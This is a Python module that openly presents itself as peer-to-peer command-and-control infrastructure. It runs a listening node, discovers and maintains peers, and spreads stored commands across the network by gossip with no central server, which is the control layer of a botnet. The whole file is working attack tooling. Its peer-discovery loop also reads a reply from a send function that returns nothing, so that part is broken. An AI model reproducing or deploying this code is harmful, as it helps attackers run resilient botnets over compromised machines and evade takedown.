"""
P2P Network - Peer-to-Peer C2 Infrastructure
Decentralized command and control without central server
"""

import asyncio
import logging
import json
import hashlib
from typing import Dict, List, Optional, Any, Set
from datetime import datetime
import random
from dataclasses import dataclass, asdict

logger = logging.getLogger(__name__)


@dataclass
class Peer:
    """Peer node information"""
    peer_id: str
    address: str
    port: int
    last_seen: datetime
    reputation: int = 100
    capabilities: List[str] = None
    
    def __post_init__(self):
        if self.capabilities is None:
            self.capabilities = []


class P2PNetwork:
    """
    Peer-to-Peer C2 Network
    Implements decentralized C2 using DHT and gossip protocol
    """
    
    def __init__(self, node_id: Optional[str] = None, port: int = 8888):
        """
        Initialize P2P network
        
        Args:
            node_id: Unique identifier for this node
            port: Port to listen on
        """
        self.node_id = node_id or self._generate_node_id()
        self.port = port
        
        # Network state
        self.peers: Dict[str, Peer] = {}
        self.routing_table: Dict[str, List[str]] = {}
        self.message_cache: Dict[str, Dict[str, Any]] = {}
        self.commands: Dict[str, Dict[str, Any]] = {}
        
        # Configuration
        self.max_peers = 50
        self.peer_timeout = 300  # 5 minutes
        self.gossip_fanout = 3
        self.replication_factor = 3
        
        logger.info(f"P2P node initialized: {self.node_id}")
        
    def _generate_node_id(self) -> str:
        """Generate unique node ID"""
        random_data = f"{datetime.now().timestamp()}_{random.random()}"
        return hashlib.sha256(random_data.encode()).hexdigest()[:16]
        
    async def start(self):
        """Start P2P network"""
        logger.info(f"Starting P2P network on port {self.port}")
        
        # Start server
        server = await asyncio.start_server(
            self._handle_connection,
            '0.0.0.0',
            self.port
        )
        
        # Start background tasks
        asyncio.create_task(self._peer_discovery_loop())
        asyncio.create_task(self._peer_maintenance_loop())
        asyncio.create_task(self._gossip_loop())
        
        logger.info("P2P network started")
        
        async with server:
            await server.serve_forever()
            
    async def _handle_connection(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
        """Handle incoming peer connection"""
        try:
            # Read message
            data = await reader.read(8192)
            message = json.loads(data.decode())
            
            # Process message
            response = await self._process_message(message)
            
            # Send response
            writer.write(json.dumps(response).encode())
            await writer.drain()
            
        except Exception as e:
            logger.error(f"Connection handling error: {e}")
        finally:
            writer.close()
            await writer.wait_closed()
            
    async def _process_message(self, message: Dict[str, Any]) -> Dict[str, Any]:
        """Process incoming message"""
        msg_type = message.get('type')
        
        if msg_type == 'ping':
            return await self._handle_ping(message)
        elif msg_type == 'peer_discovery':
            return await self._handle_peer_discovery(message)
        elif msg_type == 'command':
            return await self._handle_command(message)
        elif msg_type == 'gossip':
            return await self._handle_gossip(message)
        elif msg_type == 'query':
            return await self._handle_query(message)
        else:
            return {'status': 'error', 'message': f'Unknown message type: {msg_type}'}
            
    async def _handle_ping(self, message: Dict[str, Any]) -> Dict[str, Any]:
        """Handle ping request"""
        peer_id = message.get('peer_id')
        
        if peer_id:
            # Update peer info
            if peer_id in self.peers:
                self.peers[peer_id].last_seen = datetime.now()
                
        return {
            'status': 'success',
            'type': 'pong',
            'node_id': self.node_id,
            'timestamp': datetime.now().isoformat()
        }
        
    async def _handle_peer_discovery(self, message: Dict[str, Any]) -> Dict[str, Any]:
        """Handle peer discovery request"""
        # Return random subset of known peers
        peer_list = list(self.peers.values())
        random.shuffle(peer_list)
        sample = peer_list[:10]
        
        return {
            'status': 'success',
            'peers': [
                {
                    'peer_id': p.peer_id,
                    'address': p.address,
                    'port': p.port
                }
                for p in sample
            ]
        }
        
    async def _handle_command(self, message: Dict[str, Any]) -> Dict[str, Any]:
        """Handle command distribution"""
        command_id = message.get('command_id')
        command_data = message.get('data')
        
        # Store command
        self.commands[command_id] = {
            'data': command_data,
            'timestamp': datetime.now(),
            'received_from': message.get('sender_id')
        }
        
        # Gossip to other peers
        await self._gossip_command(command_id, command_data, exclude=message.get('sender_id'))
        
        return {'status': 'success', 'command_id': command_id}
        
    async def _handle_gossip(self, message: Dict[str, Any]) -> Dict[str, Any]:
        """Handle gossip message"""
        msg_id = message.get('message_id')
        
        # Check if already seen
        if msg_id in self.message_cache:
            return {'status': 'duplicate'}
            
        # Cache message
        self.message_cache[msg_id] = message
        
        # Propagate to random peers
        await self._propagate_gossip(message, exclude=message.get('sender_id'))
        
        return {'status': 'success'}
        
    async def _handle_query(self, message: Dict[str, Any]) -> Dict[str, Any]:
        """Handle data query"""
        query_type = message.get('query_type')
        
        if query_type == 'commands':
            # Return available commands
            return {
                'status': 'success',
                'commands': list(self.commands.keys())
            }
        elif query_type == 'command_data':
            command_id = message.get('command_id')
            if command_id in self.commands:
                return {
                    'status': 'success',
                    'data': self.commands[command_id]
                }
            else:
                return {'status': 'not_found'}
        else:
            return {'status': 'error', 'message': 'Unknown query type'}
            
    async def connect_to_peer(self, address: str, port: int) -> bool:
        """Connect to a peer"""
        try:
            reader, writer = await asyncio.open_connection(address, port)
            
            # Send ping
            message = {
                'type': 'ping',
                'peer_id': self.node_id,
                'timestamp': datetime.now().isoformat()
            }
            
            writer.write(json.dumps(message).encode())
            await writer.drain()
            
            # Read response
            data = await reader.read(1024)
            response = json.loads(data.decode())
            
            if response.get('status') == 'success':
                # Add peer
                peer_id = response.get('node_id')
                self.add_peer(peer_id, address, port)
                logger.info(f"Connected to peer: {peer_id}")
                
                writer.close()
                await writer.wait_closed()
                return True
            else:
                writer.close()
                await writer.wait_closed()
                return False
                
        except Exception as e:
            logger.error(f"Failed to connect to {address}:{port}: {e}")
            return False
            
    def add_peer(self, peer_id: str, address: str, port: int):
        """Add peer to network"""
        if len(self.peers) >= self.max_peers:
            # Remove least recently seen peer
            oldest = min(self.peers.values(), key=lambda p: p.last_seen)
            del self.peers[oldest.peer_id]
            
        self.peers[peer_id] = Peer(
            peer_id=peer_id,
            address=address,
            port=port,
            last_seen=datetime.now()
        )
        
        logger.info(f"Added peer: {peer_id} ({len(self.peers)} total)")
        
    async def broadcast_command(self, command: Dict[str, Any]) -> str:
        """
        Broadcast command to P2P network
        
        Returns:
            Command ID
        """
        command_id = hashlib.sha256(
            f"{self.node_id}_{datetime.now().timestamp()}".encode()
        ).hexdigest()[:16]
        
        # Store locally
        self.commands[command_id] = {
            'data': command,
            'timestamp': datetime.now(),
            'sender': self.node_id
        }
        
        # Gossip to peers
        await self._gossip_command(command_id, command)
        
        logger.info(f"Broadcast command: {command_id}")
        return command_id
        
    async def _gossip_command(self, command_id: str, command_data: Dict[str, Any], exclude: Optional[str] = None):
        """Gossip command to random peers"""
        # Select random peers
        available_peers = [p for p in self.peers.values() if p.peer_id != exclude]
        selected = random.sample(available_peers, min(self.gossip_fanout, len(available_peers)))
        
        for peer in selected:
            try:
                await self._send_to_peer(peer, {
                    'type': 'command',
                    'command_id': command_id,
                    'data': command_data,
                    'sender_id': self.node_id
                })
            except Exception as e:
                logger.error(f"Failed to gossip to {peer.peer_id}: {e}")
                
    async def _propagate_gossip(self, message: Dict[str, Any], exclude: Optional[str] = None):
        """Propagate gossip message"""
        available_peers = [p for p in self.peers.values() if p.peer_id != exclude]
        selected = random.sample(available_peers, min(self.gossip_fanout, len(available_peers)))
        
        for peer in selected:
            try:
                await self._send_to_peer(peer, message)
            except Exception as e:
                logger.error(f"Failed to propagate to {peer.peer_id}: {e}")
                
    async def _send_to_peer(self, peer: Peer, message: Dict[str, Any]):
        """Send message to specific peer"""
        try:
            reader, writer = await asyncio.open_connection(peer.address, peer.port)
            
            writer.write(json.dumps(message).encode())
            await writer.drain()
            
            # Read response
            data = await reader.read(1024)
            
            writer.close()
            await writer.wait_closed()
            
            # Update peer last seen
            peer.last_seen = datetime.now()
            
        except Exception as e:
            logger.error(f"Send to peer {peer.peer_id} failed: {e}")
            raise
            
    async def _peer_discovery_loop(self):
        """Continuously discover new peers"""
        while True:
            try:
                await asyncio.sleep(60)  # Every minute
                
                # Ask random peers for their peer lists
                if self.peers:
                    peer = random.choice(list(self.peers.values()))
                    
                    response = await self._send_to_peer(peer, {
                        'type': 'peer_discovery',
                        'node_id': self.node_id
                    })
                    
                    # Add new peers
                    for peer_info in response.get('peers', []):
                        if peer_info['peer_id'] not in self.peers:
                            await self.connect_to_peer(
                                peer_info['address'],
                                peer_info['port']
                            )
                            
            except Exception as e:
                logger.error(f"Peer discovery error: {e}")
                
    async def _peer_maintenance_loop(self):
        """Maintain peer connections"""
        while True:
            try:
                await asyncio.sleep(30)  # Every 30 seconds
                
                # Remove dead peers
                now = datetime.now()
                dead_peers = [
                    pid for pid, peer in self.peers.items()
                    if (now - peer.last_seen).total_seconds() > self.peer_timeout
                ]
                
                for pid in dead_peers:
                    logger.info(f"Removing dead peer: {pid}")
                    del self.peers[pid]
                    
                # Ping random peers
                if self.peers:
                    sample = random.sample(
                        list(self.peers.values()),
                        min(5, len(self.peers))
                    )
                    
                    for peer in sample:
                        try:
                            await self._send_to_peer(peer, {
                                'type': 'ping',
                                'peer_id': self.node_id
                            })
                        except:
                            pass
                            
            except Exception as e:
                logger.error(f"Peer maintenance error: {e}")
                
    async def _gossip_loop(self):
        """Periodic gossip of own status"""
        while True:
            try:
                await asyncio.sleep(120)  # Every 2 minutes
                
                # Gossip own status
                message = {
                    'type': 'gossip',
                    'message_id': hashlib.sha256(
                        f"{self.node_id}_{datetime.now().timestamp()}".encode()
                    ).hexdigest()[:16],
                    'sender_id': self.node_id,
                    'data': {
                        'peer_count': len(self.peers),
                        'command_count': len(self.commands)
                    }
                }
                
                await self._propagate_gossip(message)
                
            except Exception as e:
                logger.error(f"Gossip loop error: {e}")
                
    def get_network_status(self) -> Dict[str, Any]:
        """Get P2P network status"""
        return {
            'node_id': self.node_id,
            'peer_count': len(self.peers),
            'command_count': len(self.commands),
            'peers': [
                {
                    'peer_id': p.peer_id,
                    'address': p.address,
                    'last_seen': p.last_seen.isoformat(),
                    'reputation': p.reputation
                }
                for p in self.peers.values()
            ]
        }
